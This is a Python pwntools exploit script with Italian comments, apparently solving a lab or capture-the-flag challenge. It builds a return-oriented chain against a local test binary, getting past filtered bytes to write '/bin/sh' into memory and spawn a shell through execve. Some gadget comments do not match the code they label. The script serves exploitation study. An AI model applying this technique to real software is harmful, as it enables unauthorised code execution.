from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 136



where_to_write = int(hex(0x404050),0) # sezione .data  -> privilegi WA (write) 
pop_r12_r13 = p64(0x40134c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40134e) # pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x401353) # pop rdi; ret;
pop_rsi = p64(0x401351) # pop rsi; pop r15; ret;
pop_r15 = p64(0x401352) # pop r15; ret;
mov_rax_r13 = p64(0x4011b8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40114a) # mov qword ptr [r13], r12; ret;
add_mbr15_r14b = p64(0x40135c) # add qword ptr [rax], rbp; ret;
xor_rdx = p64(0x4011e8) 
syscall =  p64(0x4012ee) # syscall gadget

# *--------------------- Funzioni --------------------*

def set_env(binary,library) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    libc = ELF(library)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop, libc
    
def send_payload(list) :  # lista di coppie (offset:elemento) che verrà inviato al processo attivo dopo la aver applicato la funzione fit
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

def transform_badchars(rop, good_str, bad_str) : # trasforma la stringa contenuta in .data attraverso delle ADD nella stringa 
    
    for n in range(len(good_str)) :
        c = good_str[n]
        rop.raw(pop_r15) # pop r15; ret;
        rop.raw(where_to_write + n) # r15 = .data idx + 1 -> ad ogni iterazaione prende un carattere in meno dall'inizio della stringa
        while c != bad_str[n] :
            rop.raw(add_mbr15_r14b)
            c = chr(ord(c) + 1)
        
def make_good_str(bad_str, badchars) : # trasforma la nostra stringa in una che non contiene nessun badchars
    
    good_str = ""
    for c in bad_str :  
        while c in badchars :
            c = chr(ord(c) - 1)
        good_str += c
    return good_str
        
        
# *--------------------- ENV SET ---------------------*

elf, p, rop, libc = set_env('./vulnerable_code','./lib.so') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(8)
p.sendline("3")
p.recvuntil(":") # insert password

# *----------  Identificazione badchars  -------------*

#in questo caso dobbiamo fare la syscall settando i registri con i giusti contenuti 
#inoltre dobbiamo caricare in una sezione di memoria che gode di privilegi di scrittura la stringa "/bin/sh\x00" 
#per caricare poi l'indirizzo su cui risiede nel registro rdi e dobbiamo invece mettere in rax il valore decimale 
#59=0x3b, 

#ricapitolando per fare la call per la shell ci serve un gadget del tipo syscall; ret; e prima di fare ciò dobbiamo
#popolare come segue i registri
#rax = 0x3b -> syscall_excve
#rdi = (indirizzo su cui risiede la stringa /bin/sh\x00") -> specifica che file dobbiamo eseguire con la chiamata
#rsi = 0x0 -> 0 specifica nessun argomento da passare
#rdx = 0x0 

#dobbiamo trovare una zona di memoria su cui possiamo scrivere ed abbiamo i privilegi di scrittura, per farlo possiamo
#usare readelf per visdualizzare le sezioni del file su cui abbiamo privilegio di scrittura

#cercando i gadget notiamo di non avere a disposizione direttamente di ciò di cui abbiamo bisogno, ad esempio non abbiamo 
#nessun "pop rax" per poter modificare il valore di rax, però abbiamo una mov rax,r13 che possiamo sfruttare, visto che è
#presente un "pop r13", possiamo quindi caircare valori arbitrari indirettamente in rax

#per quanto riguarda la scrittura in memoria dobbiamo invece caricare l'indirizzo in r13 e per scrivere in esso possiamo 
#invce utilizzare la mov qword ptr[r13], r12; scrivendo quindi nel indirizzo puntato da r13 ciò che è contenuto in r12

#per resettare rdx non disponiamo di una pop, ma fortunatamente abbimamo due possibili gadget che fanno al caso nostro, 
#abbiamo infatti un and rdx, 0; o un "xor rdx, rdx;". Entrambi infatti portano il valore a zero, visto che lea carica
#0 in rdx mentre la xor fa la xor bytewise tra se stesso salvando al suo interno il valore risiultante, ossia 0.

#Abbiamo un altro problema a cui non avevamo ragionato, ossia quello dei badchars, probabilmente ci sono dei caratteri
#che una volta inseriti come input del codice vengono modificati così da non consentirci di fare ciò che volgiamo con lo stack,
#possiamo però arginare questo problema utilizzando dei gadget che modifichino l'input una volta inserito

bad_str = "/bin/sh\x00"
badchars = "bin/sh"

# *------ preparazione stringa bypass badchars  ------*

good_str = make_good_str(bad_str, badchars)
log.critical(f"Creata la stringa \'{good_str} \' per bypassare i badchars")

# *------ blocco chain inserimento stringa  -------*

rop = ROP(elf)
rop.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop.raw(good_str) # r12 = ".agm.rg\x00"
rop.raw(where_to_write) # r13 = .data idx
rop.raw(p64(0x01)) # r14 = 0x0000000000000001
rop.raw(where_to_write) # r15 = .data idx -> "/bin/sh\x00"
rop.raw(mov_mmr13_r12) # mov [r13], r12; ret;

# *------ blocco chain trasformaizone stringa  -------*

transform_badchars(rop, good_str, bad_str)

# *--------------- continuo ROP CHAIN ----------------*

rop.raw(pop_r13) # pop r13; pop r14; pop r15; ret;
rop.raw(p64(0x3b)) # r13 = 0x3b
rop.raw(p64(0x00)) # r14 = 0x00
rop.raw(p64(0x00)) # r15 = 0x00
rop.raw(mov_rax_r13) # mov rax = r13
rop.raw(pop_rdi) # pop rdi; ret;
rop.raw(where_to_write) # rdi = .data idx -> "/bin/sh\x00"
rop.raw(pop_rsi) # # pop rsi; pop r15; ret;
rop.raw(p64(0x00)) # rsi = 0x00
rop.raw(p64(0x00)) # r15 = 0x00
rop.raw(xor_rdx) # r15 = 0x00
rop.raw(syscall) # syscall

payload = dict();
payload[offset] = rop
p.sendline(fit(payload))
p.recvlines(3)
p.interactive()         # interazione da temrinale con processo

# *------------------      END      ------------------*